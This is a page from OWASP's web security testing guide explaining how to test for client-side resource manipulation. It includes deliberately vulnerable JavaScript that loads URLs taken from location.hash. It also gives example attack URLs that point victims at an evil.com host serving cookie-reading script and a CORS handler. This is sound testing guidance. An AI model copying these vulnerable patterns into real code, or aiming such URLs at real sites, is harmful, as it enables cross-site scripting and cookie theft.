# Testing for Client-side Resource Manipulation

|ID          |
|------------|
|WSTG-CLNT-06|

## Summary

A client-side resource manipulation vulnerability is an input validation flaw. It occurs when an application accepts user-controlled input that specifies the path of a resource such as the source of an iframe, JavaScript, applet, or the handler of an XMLHttpRequest. This vulnerability consists of the ability to control the URLs that link to some resources present in a web page. The impact of this vulnerability varies, and it is usually adopted to conduct XSS attacks. This vulnerability makes it is possible to interfere with the expected application's behavior by causing it to load and render malicious objects.

The following JavaScript code shows a possible vulnerable script in which an attacker is able to control the `location.hash` (source) which reaches the attribute `src` of a script element. This particular case leads to a XSS attack as external JavaScript could be injected.

```html
<script>
    var d=document.createElement("script");
    if(location.hash.slice(1)) {
        d.src = location.hash.slice(1);
    }
    document.body.appendChild(d);
</script>
```

An attacker could target a victim by causing them to visit this URL:

`www.victim.com/#http://evil.com/js.js`

Where `js.js` contains:

```js
alert(document.cookie)
```

This would cause the alert to pop up on the victim's browser.

A more damaging scenario involves the possibility of controlling the URL called in a CORS request. Since CORS allows the target resource to be accessible by the requesting domain through a header-based approach, the attacker may ask the target page to load malicious content from its own website.

Here is an example of a vulnerable page:

```html
<b id="p"></b>
<script>
    function createCORSRequest(method, url) {
        var xhr = new XMLHttpRequest();
        xhr.open(method, url, true);
        xhr.onreadystatechange = function () {
            if (this.status == 200 && this.readyState == 4) {
                document.getElementById('p').innerHTML = this.responseText;
            }
        };
        return xhr;
    }

    var xhr = createCORSRequest('GET', location.hash.slice(1));
    xhr.send(null);
</script>
```

The `location.hash` is controlled by user input and is used for requesting an external resource, which will then be reflected through the construct `innerHTML`. An attacker could ask a victim to visit the following URL:

`www.victim.com/#http://evil.com/html.html`

With the payload handler for `html.html`:

```html
<?php
header('Access-Control-Allow-Origin: http://www.victim.com');
?>
<script>alert(document.cookie);</script>
```

## Test Objectives

- Identify sinks with weak input validation.
- Assess the impact of the resource manipulation.

## How to Test

To manually check for this type of vulnerability, we must identify whether the application employs inputs without correctly validating them. If so, these inputs are under the control of the user and could be used to specify external resources. Since there are many resources that could be included in the application (such as images, video, objects, css, and iframes), the client-side scripts that handle the associated URLs should be investigated for potential issues.

The following table shows possible injection points (sink) that should be checked:

| Resource Type   | Tag/Method                                | Sink   |
| --------------- | ----------------------------------------- | ------ |
| Frame           | iframe                                    | src    |
| Link            | a                                         | href   |
| AJAX Request    | `xhr.open(method, [url], true);` | URL    |
| CSS             | link                                      | href   |
| Image           | img                                       | src    |
| Object          | object                                    | data   |
| Script          | script                                    | src    |

The most interesting ones are those that allow to an attacker to include client-side code (for example JavaScript) that could lead to XSS vulnerabilities.
